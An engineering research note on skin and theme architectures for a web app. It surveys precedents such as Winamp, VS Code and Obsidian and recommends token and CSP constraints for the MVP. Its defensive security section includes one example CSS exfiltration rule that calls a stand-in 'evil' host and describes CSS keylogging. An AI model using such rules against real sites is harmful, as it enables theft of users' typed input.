# Research: skinning architecture (Winamp-style themes over web UI)

Ticket: [GEM-105](https://linear.app/gembag/issue/GEM-105). Date: 2026-08-20.

Question: what architectures exist for user-supplied skins/themes on web apps, and what must the MVP's
shadcn + CSS-variable discipline respect so a real skin engine stays possible post-MVP without rework?

---

## 1. Precedent survey

### Winamp classic skins (the reference model)
- A classic skin is a `.wsz` (renamed ZIP) of **BMP sprite sheets + INI files**: `main.bmp`,
  `cbuttons.bmp`, `eqmain.bmp`, `pledit.bmp`, bitmap fonts in `text.bmp`/`nums.bmp`, optional `.cur`
  cursors. ([Winamp Developer Wiki](http://wiki.winamp.com/wiki/Creating_Classic_Skins),
  [Just Solve the File Format Problem](http://justsolve.archiveteam.org/wiki/Winamp_Skin))
- Key property: **fixed geometry**. Every classic skin shares the same pixel dimensions, button layout,
  and hit regions; authors only replace a standard set of images. No layout change, no code. That is
  exactly why thousands of amateurs could make skins safely: the contract is "paint these known
  rectangles."
- Winamp *Modern* skins (XML layout + MAKI scripts) allowed changing form/function — i.e. code
  execution — and are the cautionary tale, not the model.
- Web-relevant proof: **Webamp** (webamp.org) renders unmodified classic `.wsz` files in the browser by
  mapping each sprite region to positioned DOM elements. A sprite-based skin engine is fully viable in
  a web app.

### VS Code themes
- A color theme is a **JSON mapping from a published identifier namespace to colors**
  (`colors` for workbench UI, `tokenColors` for syntax). Declarative data, no CSS, no code.
  ([Color Theme guide](https://code.visualstudio.com/api/extension-guides/color-theme),
  [Theming capability](https://code.visualstudio.com/api/extension-capabilities/theming))
- Distribution detail that matters to us: for webviews (iframes isolated from internal APIs), VS Code
  **exposes every theme color as a CSS variable on the webview's root element** and rewrites them on
  theme change. I.e. even a JSON-token system ultimately compiles down to a CSS-variable contract.

### Obsidian themes + CSS snippets
- The opposite pole: a community theme is **arbitrary CSS loaded into the app**, layered over an
  extensive built-in CSS-variable vocabulary; users can additionally load per-feature CSS snippets.
- Guardrails from their guidelines ([Theme guidelines](https://docs.obsidian.md/Themes/App+themes/Theme+guidelines)):
  - **No remote assets** — fonts/images must be bundled; zero network calls (privacy + offline).
  - Override variables under `:root`/`body`/`.theme-light`/`.theme-dark`; keep selector specificity
    low; avoid `!important` so user snippets can still win.
  - Themes are reviewed/scanned on submission and do **not** auto-update, for security/stability.
- Lesson: full-CSS theming works, but only because (a) app DOM/variables are treated as a
  semi-public API, and (b) a human+automated review pipeline plus a no-network rule contains the risk.
  Obsidian is also a local desktop app with no cross-user story — weaker threat model than a hosted
  web app.

### Home Assistant themes
- Themes are **YAML maps of CSS-variable names to values** in `configuration.yaml`, with optional
  `modes: {light, dark}` sub-maps layered on top; services `frontend.set_theme` /
  `frontend.reload_themes`. ([Frontend integration docs](https://www.home-assistant.io/integrations/frontend/))
- Distributed via HACS as data files. Chronic pain point: the variable vocabulary was never a stable,
  documented contract, so themes break between releases
  ([community discussion](https://github.com/orgs/home-assistant/discussions/488)). Lesson: a token
  contract is only useful if it is **versioned and documented**; otherwise every release is a skin-breaking
  change.

### Slack
- Official theming = **~8 color slots for the sidebar only**; message pane colors are fixed
  ([Change your Slack theme](https://slack.com/help/articles/205166337-Change-your-Slack-theme)).
  A deliberately tiny palette contract: zero security surface, zero support burden, but users who want
  more resort to unofficial CSS injection. Lesson: too small a contract just pushes users to unsafe
  workarounds.

### Discord
- No user theming at all; themes exist only via client mods (BetterDiscord, Vencord) that **inject
  arbitrary CSS/JS into the client**, which Discord's ToS prohibits
  ([Discord support thread](https://support.discord.com/hc/en-us/community/posts/360056064111-A-proposal-to-solve-BetterDiscord-and-other-client-mods)).
  Discord's stated reasons: it cannot audit modified clients, and CSS/JS injection in a chat app is a
  credential-theft and self-XSS vector (themes routinely shipped with plugin loaders). Lesson: when the
  app handles messages/tokens from other users, "just let people paste CSS" is a real attack channel,
  not a hypothetical.

### Stylus / userstyles (UserCSS)
- User-side CSS injection managed by a browser extension; UserCSS format adds metadata +
  **user-configurable variables** on top of plain CSS
  ([UserCSS wiki](https://github.com/openstyles/stylus/wiki/Usercss)). Moderation is thin;
  the ecosystem's history (Stylish telemetry scandal, malicious styles) shows unreviewed
  third-party styles are a genuine risk surface. Also demonstrates demand: users will style your app
  with or without you — a stable DOM helps even unofficial styling survive releases.

---

## 2. Viable skin-engine models

| Model | Precedent | Skin payload | What it can change | Risk |
|---|---|---|---|---|
| **A. Token pack** | VS Code colors, Home Assistant, Slack | JSON/YAML: token → value | Colors, radii, fonts, spacing, shadows — whatever is tokenized | ~None (values validated, no selectors, no URLs) |
| **B. Sprite/asset skin** | Winamp classic, Webamp | ZIP of images (+ token file) | Everything visual on a **fixed-geometry** chrome; pixel-authentic Winamp look | Low (images only; needs asset hygiene, size caps) |
| **C. Full CSS replacement** | Obsidian, UserCSS | Arbitrary stylesheet over stable DOM | Layout, structure-adjacent restyling | High (CSS exfiltration, UI redressing, breakage every release) — needs sanitizer + CSP + review pipeline |
| **D. Scripted/structural skin** | Winamp Modern, BetterDiscord | Markup + code | Form and function | Effectively plugin execution. **Rejected** — out of scope for a skin engine. |

Realistic post-MVP path for Time Stop: **A first, then B for the Winamp-style differentiator**, with C
as an optional "advanced/unsafe, local-only" tier if ever wanted. A and B compose: a Winamp-style skin
is a token pack + sprite assets for the player-like chrome (timer widget), while the rest of the app
stays token-themed.

### What each model demands of the MVP

**Model A (token pack) demands:**
- Every visual decision routed through a **named CSS custom property** — no hardcoded colors, radii,
  fonts, or shadows in components; no Tailwind arbitrary values (`bg-[#123456]`), no inline style colors.
- Tokens are **semantic** (role-based: `--background`, `--primary`, `--destructive`), not literal
  (`--blue-500`), and come in shadcn-style **surface/foreground pairs** so contrast is themeable as a
  unit ([shadcn theming docs](https://ui.shadcn.com/docs/theming)).
- Dark mode implemented **only** as a token re-assignment under a root class/attribute — never
  per-component dark logic — so a skin can define both modes or opt out.
- The token list is a **versioned, documented contract file** (the Home Assistant lesson). One source
  of truth (`:root` block in one CSS file); adding a token is additive, renaming is a breaking change.

**Model B (sprite skin) additionally demands:**
- The skinnable chrome (post-MVP: the timer/player widget) has **stable geometry and named regions** —
  components sized by tokens, not by content-driven layout, in the area meant to be skinned.
- Backgrounds/decorations delivered via CSS (`background-image` on tokened slots), not `<img>` content,
  so a skin can swap them without markup changes.
- App works with **bundled local assets only**; nothing assumes a CDN.

**Model C (full CSS) additionally demands:**
- Treat the DOM as a public API: **stable semantic class names / `data-` hooks on every major region**
  (`data-part="timer-display"` etc.), survive refactors, low-specificity internal styles, no
  `!important`, styles layered (e.g. CSS `@layer app, skin`) so skin CSS can win without specificity wars.
- A sanitization/review + CSP story (below) before any sharing of skins between users.

---

## 3. Security implications of third-party CSS/assets

CSS is not inert. Established attack classes:

- **Data exfiltration via attribute selectors**: `input[value^="a"] { background:url(https://evil/a) }`
  brute-forces attribute values char-by-char; modern variants use `:has()`, `:checked`, font-based
  ligature tricks. Demonstrated as full **CSS-only keyloggers** against webmail (Heyes, Black Hat 2026:
  [PortSwigger research](https://portswigger.net/research/css-the-bomb-inside-your-inbox);
  [Gualtieri, Stealing Data With CSS](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/);
  [OWASP CSS injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection)).
- **Tracking/side channels**: any `url()` (background, fonts, cursors, `@import`) is a network beacon
  keyed to app state; conditional loading leaks what the user sees/types.
- **UI redressing inside the app**: CSS can hide warnings, repaint a destructive button as benign, or
  overlay fake UI — relevant once Time Stop is multi-user or shows anything security-relevant.
- **Availability**: pathological selectors / "CSS bombs" can hang the renderer.
- **Ecosystem risk**: unreviewed style repositories (Stylish) and Discord client-mod themes show the
  supply-chain angle — a "skin store" needs review/scanning and no silent auto-update (Obsidian's rule).

Mitigations, in order of strength:
1. **Structural**: models A/B never accept selectors or URLs — the attack classes above don't exist.
   This is the core argument for token+sprite as the primary engine.
2. **CSP**: strict `Content-Security-Policy` with no external `img-src`/`font-src`/`style-src` origins
   is the only robust backstop against exfiltration beacons; skin assets served from the app's own
   origin (self-hosted fits perfectly). Never carve out wildcard image origins for skins.
3. **Sanitization** (only if model C ships): parse the stylesheet, strip `@import`, all external
   `url()` (rewrite to bundled assets), behavioral at-rules; cap size. Note sanitizers are
   bypass-prone — treat as defense-in-depth, not the boundary.
4. **Data hygiene now**: never mirror sensitive values into DOM attributes or `value` attributes that
   CSS selectors could match (React controlled inputs already avoid attribute reflection; keep it that way).
5. **Provenance**: skins install as files the user placed on their own server (self-hosted model), not
   auto-fetched from third-party URLs; if a gallery ever exists, review + pinned versions.

---

## 4. Recommended MVP constraint set

Cheap now, expensive to retrofit. Proposed as ADR material:

1. **Single token contract file.** All colors, radii, fonts, shadows, and key spacing defined as CSS
   custom properties in one place (`:root` + `.dark` in the global stylesheet), shadcn-style semantic
   names with surface/foreground pairs. This file *is* the future skin API — treat edits as API changes.
2. **No off-token styling.** Lint-level discipline: no hex/oklch literals in components, no Tailwind
   arbitrary color/radius values, no inline style colors. Components reference tokens only.
3. **Dark mode = token swap only.** One root class/attribute flips the palette; no per-component
   `dark:` colors that bypass the token layer (Tailwind `dark:` is fine only where it resolves to tokens).
4. **Stable skin hooks in markup.** Major UI regions carry stable semantic identifiers
   (`data-part`/BEM-ish classes), especially the timer widget. No styling that depends on DOM order or
   generated class names being stable — assume a future stylesheet targets these hooks.
5. **No `!important`, low specificity, and put app styles in a CSS `@layer`** so future skin CSS can
   override without wars.
6. **Decorative imagery via CSS on tokened slots**, not content `<img>`s; all assets bundled/local;
   nothing loads from third-party origins (also enables a strict CSP from day one).
7. **Ship a strict CSP now** (self-only sources). It costs nothing at MVP and is the non-negotiable
   backstop for any future skin tier.
8. **Keep sensitive data out of styleable attribute surfaces** (no secrets/tokens in DOM attributes).
9. **Timer widget: design toward fixed geometry.** Size chrome elements with tokens
   (`--timer-*` dimensions), so a Winamp-style sprite skin can later repaint it without layout rework.

With these, post-MVP can ship Model A (token packs) almost for free, Model B (Winamp-style sprite
skins) with contained new work on the timer chrome, and still leaves Model C possible behind a
review/sanitize/CSP gate — no rework of MVP components required.

---

## Sources

- Winamp classic skins: [Winamp Developer Wiki](http://wiki.winamp.com/wiki/Creating_Classic_Skins), [Winamp Skin format](http://justsolve.archiveteam.org/wiki/Winamp_Skin), [Alpha-II templates](https://www.alpha-ii.com/Info/Template.html)
- VS Code: [Color Theme extension guide](https://code.visualstudio.com/api/extension-guides/color-theme), [Theming capability](https://code.visualstudio.com/api/extension-capabilities/theming)
- Obsidian: [Theme guidelines](https://docs.obsidian.md/Themes/App+themes/Theme+guidelines)
- Home Assistant: [Frontend integration / themes](https://www.home-assistant.io/integrations/frontend/), [theming DX discussion](https://github.com/orgs/home-assistant/discussions/488)
- Slack: [Change your Slack theme](https://slack.com/help/articles/205166337-Change-your-Slack-theme)
- Discord: [client-mod policy discussion](https://support.discord.com/hc/en-us/community/posts/360056064111-A-proposal-to-solve-BetterDiscord-and-other-client-mods), [BetterDiscord](https://betterdiscord.app/)
- Stylus/UserCSS: [UserCSS wiki](https://github.com/openstyles/stylus/wiki/Usercss), [Stylus FAQ](https://github.com/openstyles/stylus/wiki/FAQ)
- shadcn/ui: [Theming docs](https://ui.shadcn.com/docs/theming)
- CSS security: [PortSwigger — CSS: the bomb inside your inbox](https://portswigger.net/research/css-the-bomb-inside-your-inbox), [Gualtieri — Stealing Data With CSS](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/), [OWASP — Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection), [CSS-Tricks — CSS Security Vulnerabilities](https://css-tricks.com/css-security-vulnerabilities/)
